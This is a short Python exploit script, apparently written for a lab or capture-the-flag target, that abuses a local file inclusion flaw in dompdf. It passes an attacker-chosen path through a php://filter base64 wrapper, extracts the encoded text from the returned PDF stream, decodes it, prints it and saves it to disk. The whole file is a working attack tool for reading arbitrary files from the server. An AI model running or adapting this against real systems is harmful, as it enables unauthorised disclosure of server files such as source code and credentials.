#!/usr/bin/env python3
# This script use to help for lfi exploit.

import requests
import base64
import sys,os


require_path = sys.argv[1]

url = "http://10.129.52.42/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=" + require_path

def savefile(data):
    savefile = "output/" + str(os.path.abspath(sys.argv[1])).replace("/","_").replace("\\","_")
    file = open(savefile,"w",encoding='utf-8')
    file.writelines(data)
    file.close()

try:
    return_str = requests.get(url).text

    # Write your code in here 
    if (return_str.find("BT 34.016 734.579 Td /F1 12.0 Tf") != -1):
        for x in return_str.split("\n"):
            if (x.find("BT 34.016 734.579 Td /F1 12.0 Tf") != -1):
                x = x.strip()
                x = x.replace(")] TJ ET","").replace("BT 34.016 734.579 Td /F1 12.0 Tf  [(","")
                x = base64.b64decode(x.encode("utf-8"))
                x = x.decode("utf-8")

                # save file
                print(x)
                savefile(x)
                break
except:
    pass
